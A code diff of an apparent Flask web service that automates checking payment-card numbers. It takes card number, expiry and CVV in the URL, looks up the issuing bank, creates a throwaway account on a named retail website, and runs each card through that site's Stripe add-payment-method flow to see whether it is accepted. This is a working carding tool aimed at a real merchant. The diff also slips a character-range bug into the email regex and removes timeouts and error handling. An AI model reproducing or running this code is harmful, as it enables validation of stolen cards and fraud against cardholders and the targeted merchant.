@@ -211,7 +211,7 @@ def register_new_user(session: requests.Session, headers: Dict[str, str], email:
 
 def validate_email_format(email: str) -> bool:
     """Validate email format."""
-    email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
+    email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-z]{2,}$'
     return bool(re.match(email_pattern, email))
 
 def get_current_time_str() -> str:
@@ -297,25 +297,119 @@ def fetch_bin_info(bin_number: str) -> Dict[str, Any]:
             "error": f"Unexpected error: {str(e)}"
         }
 
-def _add_payment_method_with_email_and_bin(email: str, details: str, start_time: str, 
-                                          bin_info: Optional[Dict[str, Any]] = None, 
-                                          bin_lookup_time: Optional[str] = None) -> Tuple[Response, int]:
-    """Internal function to handle adding payment method with email and BIN info."""
+@app.route('/add_payment_method/<details>', methods=['GET'])
+def add_payment_method_auto_email(details: str) -> Response:
+    """Automatically generate email and add payment method with BIN lookup."""
+    start_time = get_current_time_str()
+    bin_lookup_time = None
+    bin_info = None
+    
     try:
+        # Generate random email
+        email = generate_random_email()
+        print(f"Generated email: {email}")
+        
         # Extract card details from URL path
         parts: list[str] = details.split('|')
         if len(parts) != 4:
             end_time = get_current_time_str()
-            response_data = {
+            return jsonify({
                 'error': 'Invalid card details format. Use cc|mm|yy|cvv',
                 'Time': calculate_time_taken(start_time, end_time)
-            }
-            if bin_info:
-                response_data['bin_lookup'] = bin_info
-            if bin_lookup_time:
-                response_data['bin_lookup_time'] = bin_lookup_time
-            return jsonify(response_data), 400
-            
+            }), 400
+        
+        cc, mm, yy, cvv = parts
+        if not all([cc, mm, yy, cvv]):
+            end_time = get_current_time_str()
+            return jsonify({
+                'error': 'Missing required card details',
+                'Time': calculate_time_taken(start_time, end_time)
+            }), 400
+        
+        # Perform BIN lookup (extract first 6 digits)
+        bin_number = cc[:6] if len(cc) >= 6 else cc
+        bin_lookup_start = get_current_time_str()
+        bin_info = fetch_bin_info(bin_number)
+        bin_lookup_end = get_current_time_str()
+        bin_lookup_time = calculate_time_taken(bin_lookup_start, bin_lookup_end)
+        
+        # Continue with payment method addition
+        return _add_payment_method_with_email_and_bin(email, details, start_time, bin_info, bin_lookup_time)
+        
+    except Exception as e:
+        end_time = get_current_time_str()
+        response_data = {
+            'error': str(e), 
+            'Time': calculate_time_taken(start_time, end_time)
+        }
+        if bin_info:
+            response_data['bin_lookup'] = bin_info
+        if bin_lookup_time:
+            response_data['bin_lookup_time'] = bin_lookup_time
+        return jsonify(response_data), 500
+
+@app.route('/add_payment_method_with_email/<email>/<details>', methods=['GET'])
+def add_payment_method_with_email(email: str, details: str) -> Response:
+    """Add payment method with provided email and include BIN lookup."""
+    start_time = get_current_time_str()
+    bin_lookup_time = None
+    bin_info = None
+    
+    try:
+        # Validate email format
+        if not validate_email_format(email):
+            end_time = get_current_time_str()
+            return jsonify({
+                'error': 'Invalid email format', 
+                'Time': calculate_time_taken(start_time, end_time)
+            }), 400
+        
+        # Extract card details from URL path
+        parts: list[str] = details.split('|')
+        if len(parts) != 4:
+            end_time = get_current_time_str()
+            return jsonify({
+                'error': 'Invalid card details format. Use cc|mm|yy|cvv',
+                'Time': calculate_time_taken(start_time, end_time)
+            }), 400
+        
+        cc, mm, yy, cvv = parts
+        if not all([cc, mm, yy, cvv]):
+            end_time = get_current_time_str()
+            return jsonify({
+                'error': 'Missing required card details',
+                'Time': calculate_time_taken(start_time, end_time)
+            }), 400
+        
+        # Perform BIN lookup (extract first 6 digits)
+        bin_number = cc[:6] if len(cc) >= 6 else cc
+        bin_lookup_start = get_current_time_str()
+        bin_info = fetch_bin_info(bin_number)
+        bin_lookup_end = get_current_time_str()
+        bin_lookup_time = calculate_time_taken(bin_lookup_start, bin_lookup_end)
+        
+        # Continue with payment method addition
+        return _add_payment_method_with_email_and_bin(email, details, start_time, bin_info, bin_lookup_time)
+        
+    except Exception as e:
+        end_time = get_current_time_str()
+        response_data = {
+            'error': str(e), 
+            'Time': calculate_time_taken(start_time, end_time)
+        }
+        if bin_info:
+            response_data['bin_lookup'] = bin_info
+        if bin_lookup_time:
+            response_data['bin_lookup_time'] = bin_lookup_time
+        return jsonify(response_data), 500
+
+def _add_payment_method_with_email_and_bin(email: str, details: str, start_time: str, 
+                                          bin_info: Optional[Dict[str, Any]] = None, 
+                                          bin_lookup_time: Optional[str] = None) -> Response:
+    """Internal function to handle adding payment method with email and BIN info."""
+    try:
+        # Extract card details from URL path
+        parts: list[str] = details.split('|')
         cc, mm, yy, cvv = parts
 
         # Create a session to persist cookies across requests
@@ -368,31 +462,7 @@ def _add_payment_method_with_email_and_bin(email: str, details: str, start_time:
 
         # Step 3: Fetch the add payment method page (now authenticated)
         page_url: str = 'https://www.dsegni.com/en/my-account/add-payment-method/'
-        try:
-            page_response: requests.Response = session.get(page_url, headers=headers, timeout=10)
-            if page_response.status_code != 200:
-                end_time = get_current_time_str()
-                response_data = {
-                    'error': f'Failed to load add payment method page. Status: {page_response.status_code}',
-                    'Time': calculate_time_taken(start_time, end_time)
-                }
-                if bin_info:
-                    response_data['bin_lookup'] = bin_info
-                if bin_lookup_time:
-                    response_data['bin_lookup_time'] = bin_lookup_time
-                return jsonify(response_data), 500
-        except Exception as e:
-            end_time = get_current_time_str()
-            response_data = {
-                'error': f'Error loading add payment method page: {str(e)}',
-                'Time': calculate_time_taken(start_time, end_time)
-            }
-            if bin_info:
-                response_data['bin_lookup'] = bin_info
-            if bin_lookup_time:
-                response_data['bin_lookup_time'] = bin_lookup_time
-            return jsonify(response_data), 500
-            
+        page_response: requests.Response = session.get(page_url, headers=headers)
         html: str = page_response.text
 
         # Extract Stripe params (wc_stripe_params or wc_stripe_upe_params)
@@ -415,19 +485,7 @@ def _add_payment_method_with_email_and_bin(email: str, details: str, start_time:
         # Clean trailing commas in JSON (common in inline scripts)
         params_str = re.sub(r",\s*}", "}", params_str)
         params_str = re.sub(r",\s*]", "]", params_str)
-        try:
-            wc_params: Dict[str, Any] = json.loads(params_str)
-        except json.JSONDecodeError as e:
-            end_time = get_current_time_str()
-            response_data = {
-                'error': f'Failed to parse Stripe params JSON: {str(e)}',
-                'Time': calculate_time_taken(start_time, end_time)
-            }
-            if bin_info:
-                response_data['bin_lookup'] = bin_info
-            if bin_lookup_time:
-                response_data['bin_lookup_time'] = bin_lookup_time
-            return jsonify(response_data), 500
+        wc_params: Dict[str, Any] = json.loads(params_str)
 
         # Get the correct nonce for creating setup intent
         ajax_nonce: str | None = wc_params.get('createAndConfirmSetupIntentNonce')
@@ -475,26 +533,12 @@ def _add_payment_method_with_email_and_bin(email: str, details: str, start_time:
             f'&_stripe_version=2024-06-20'
         )
         
-        try:
-            pm_response: requests.Response = requests.post(
-                'https://api.stripe.com/v1/payment_methods',
-                headers=stripe_headers,
-                data=stripe_data,
-                timeout=10
-            )
-            pm_json: Dict[str, Any] = pm_response.json()
-        except Exception as e:
-            end_time = get_current_time_str()
-            response_data = {
-                'error': f"Failed to create Stripe payment method: {str(e)}",
-                'Time': calculate_time_taken(start_time, end_time)
-            }
-            if bin_info:
-                response_data['bin_lookup'] = bin_info
-            if bin_lookup_time:
-                response_data['bin_lookup_time'] = bin_lookup_time
-            return jsonify(response_data), 500
-            
+        pm_response: requests.Response = requests.post(
+            'https://api.stripe.com/v1/payment_methods',
+            headers=stripe_headers,
+            data=stripe_data
+        )
+        pm_json: Dict[str, Any] = pm_response.json()
         if 'error' in pm_json:
             end_time = get_current_time_str()
             response_data = {
@@ -524,32 +568,12 @@ def _add_payment_method_with_email_and_bin(email: str, details: str, start_time:
             'wc-stripe-payment-type': 'card',
             '_ajax_nonce': ajax_nonce,
         }
-        
-        try:
-            final_response: requests.Response = session.post(
-                'https://www.dsegni.com/wp-admin/admin-ajax.php',
-                headers=ajax_headers,
-                data=ajax_data,
-                timeout=10
-            )
-            
-            # Try to parse JSON response
-            try:
-                final_json: Dict[str, Any] = final_response.json() if final_response.headers.get('content-type', '').startswith('application/json') else {'raw': final_response.text, 'status_code': final_response.status_code}
-            except:
-                final_json = {'raw': final_response.text, 'status_code': final_response.status_code}
-                
-        except Exception as e:
-            end_time = get_current_time_str()
-            response_data = {
-                'error': f"Failed to confirm setup intent: {str(e)}",
-                'Time': calculate_time_taken(start_time, end_time)
-            }
-            if bin_info:
-                response_data['bin_lookup'] = bin_info
-            if bin_lookup_time:
-                response_data['bin_lookup_time'] = bin_lookup_time
-            return jsonify(response_data), 500
+        final_response: requests.Response = session.post(
+            'https://www.dsegni.com/wp-admin/admin-ajax.php',
+            headers=ajax_headers,
+            data=ajax_data
+        )
+        final_json: Dict[str, Any] = final_response.json() if final_response.headers.get('content-type', '').startswith('application/json') else {'raw': final_response.text}
         
         end_time = get_current_time_str()
         
@@ -578,118 +602,12 @@ def _add_payment_method_with_email_and_bin(email: str, details: str, start_time:
             'expiry': f"{mm}/{yy}"
         }
         
-        return jsonify(response_data), 200
+        return jsonify(response_data)
         
     except Exception as e:
         end_time = get_current_time_str()
         response_data = {
-            'error': f"Unexpected error: {str(e)}",
-            'Time': calculate_time_taken(start_time, end_time)
-        }
-        if bin_info:
-            response_data['bin_lookup'] = bin_info
-        if bin_lookup_time:
-            response_data['bin_lookup_time'] = bin_lookup_time
-        return jsonify(response_data), 500
-
-@app.route('/add_payment_method/<details>', methods=['GET'])
-def add_payment_method_auto_email(details: str) -> Tuple[Response, int]:
-    """Automatically generate email and add payment method with BIN lookup."""
-    start_time = get_current_time_str()
-    bin_lookup_time = None
-    bin_info = None
-    
-    try:
-        # Generate random email
-        email = generate_random_email()
-        print(f"Generated email: {email}")
-        
-        # Extract card details from URL path
-        parts: list[str] = details.split('|')
-        if len(parts) != 4:
-            end_time = get_current_time_str()
-            return jsonify({
-                'error': 'Invalid card details format. Use cc|mm|yy|cvv',
-                'Time': calculate_time_taken(start_time, end_time)
-            }), 400
-        
-        cc, mm, yy, cvv = parts
-        if not all([cc, mm, yy, cvv]):
-            end_time = get_current_time_str()
-            return jsonify({
-                'error': 'Missing required card details',
-                'Time': calculate_time_taken(start_time, end_time)
-            }), 400
-        
-        # Perform BIN lookup (extract first 6 digits)
-        bin_number = cc[:6] if len(cc) >= 6 else cc
-        bin_lookup_start = get_current_time_str()
-        bin_info = fetch_bin_info(bin_number)
-        bin_lookup_end = get_current_time_str()
-        bin_lookup_time = calculate_time_taken(bin_lookup_start, bin_lookup_end)
-        
-        # Continue with payment method addition
-        return _add_payment_method_with_email_and_bin(email, details, start_time, bin_info, bin_lookup_time)
-        
-    except Exception as e:
-        end_time = get_current_time_str()
-        response_data = {
-            'error': f"Endpoint error: {str(e)}", 
-            'Time': calculate_time_taken(start_time, end_time)
-        }
-        if bin_info:
-            response_data['bin_lookup'] = bin_info
-        if bin_lookup_time:
-            response_data['bin_lookup_time'] = bin_lookup_time
-        return jsonify(response_data), 500
-
-@app.route('/add_payment_method_with_email/<email>/<details>', methods=['GET'])
-def add_payment_method_with_email(email: str, details: str) -> Tuple[Response, int]:
-    """Add payment method with provided email and include BIN lookup."""
-    start_time = get_current_time_str()
-    bin_lookup_time = None
-    bin_info = None
-    
-    try:
-        # Validate email format
-        if not validate_email_format(email):
-            end_time = get_current_time_str()
-            return jsonify({
-                'error': 'Invalid email format', 
-                'Time': calculate_time_taken(start_time, end_time)
-            }), 400
-        
-        # Extract card details from URL path
-        parts: list[str] = details.split('|')
-        if len(parts) != 4:
-            end_time = get_current_time_str()
-            return jsonify({
-                'error': 'Invalid card details format. Use cc|mm|yy|cvv',
-                'Time': calculate_time_taken(start_time, end_time)
-            }), 400
-        
-        cc, mm, yy, cvv = parts
-        if not all([cc, mm, yy, cvv]):
-            end_time = get_current_time_str()
-            return jsonify({
-                'error': 'Missing required card details',
-                'Time': calculate_time_taken(start_time, end_time)
-            }), 400
-        
-        # Perform BIN lookup (extract first 6 digits)
-        bin_number = cc[:6] if len(cc) >= 6 else cc
-        bin_lookup_start = get_current_time_str()
-        bin_info = fetch_bin_info(bin_number)
-        bin_lookup_end = get_current_time_str()
-        bin_lookup_time = calculate_time_taken(bin_lookup_start, bin_lookup_end)
-        
-        # Continue with payment method addition
-        return _add_payment_method_with_email_and_bin(email, details, start_time, bin_info, bin_lookup_time)
-        
-    except Exception as e:
-        end_time = get_current_time_str()
-        response_data = {
-            'error': f"Endpoint error: {str(e)}", 
+            'error': str(e),
             'Time': calculate_time_taken(start_time, end_time)
         }
         if bin_info:
